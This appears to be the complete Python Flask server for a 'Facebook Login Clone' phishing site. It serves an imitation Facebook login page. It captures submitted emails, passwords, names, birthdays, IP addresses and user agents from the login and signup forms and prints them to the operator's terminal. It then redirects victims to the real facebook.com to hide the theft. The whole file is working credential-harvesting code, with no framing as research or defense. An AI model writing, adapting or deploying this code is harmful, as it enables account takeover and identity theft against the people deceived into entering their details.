from flask import Flask, render_template, request, jsonify, redirect, url_for
from datetime import datetime
import os

app = Flask(__name__)

# Configure the template and static folders
app.template_folder = 'templates'
app.static_folder = 'static'

@app.route('/')
def index():
    """Serve the main Facebook login page"""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission"""
    try:
        # Get form data
        email = request.form.get('email')
        password = request.form.get('password')
        
        # Print login data to terminal
        print("\n" + "="*50)
        print("LOGIN ATTEMPT")
        print("="*50)
        print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Email/Phone: {email}")
        print(f"Password: {password}")
        print(f"IP Address: {request.remote_addr}")
        print(f"User Agent: {request.headers.get('User-Agent')}")
        print("="*50 + "\n")
        
        # Redirect to original Facebook website after logging data
        return redirect('https://www.facebook.com')
        
    except Exception as e:
        print(f"Error processing login: {e}")
        return redirect(url_for('index'))

@app.route('/signup', methods=['POST'])
def signup():
    """Handle signup form submission"""
    try:
        # Get form data
        first_name = request.form.get('first_name')
        last_name = request.form.get('last_name')
        email = request.form.get('email')
        password = request.form.get('password')
        birth_month = request.form.get('birth_month')
        birth_day = request.form.get('birth_day')
        birth_year = request.form.get('birth_year')
        gender = request.form.get('gender')
        
        # Print signup data to terminal
        print("\n" + "="*50)
        print("SIGNUP ATTEMPT")
        print("="*50)
        print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"First Name: {first_name}")
        print(f"Last Name: {last_name}")
        print(f"Email: {email}")
        print(f"Password: {password}")
        print(f"Birthday: {birth_month}/{birth_day}/{birth_year}")
        print(f"Gender: {gender}")
        print(f"IP Address: {request.remote_addr}")
        print(f"User Agent: {request.headers.get('User-Agent')}")
        print("="*50 + "\n")
        
        # Redirect to original Facebook website after logging data
        return redirect('https://www.facebook.com')
        
    except Exception as e:
        print(f"Error processing signup: {e}")
        return redirect(url_for('index'))

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'message': 'Facebook Login Clone API is running'
    })

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return redirect(url_for('index'))

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    print(f"Internal server error: {error}")
    return redirect(url_for('index'))

if __name__ == '__main__':
    # Create necessary directories
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static', exist_ok=True)
    
    print("="*60)
    print("FACEBOOK LOGIN CLONE - FLASK SERVER")
    print("="*60)
    print("Server starting...")
    print("Navigate to: http://localhost:5000")
    print("All form submissions will be printed to this terminal")
    print("="*60 + "\n")
    
    # Run the Flask app
    app.run(debug=True, host='0.0.0.0', port=5000)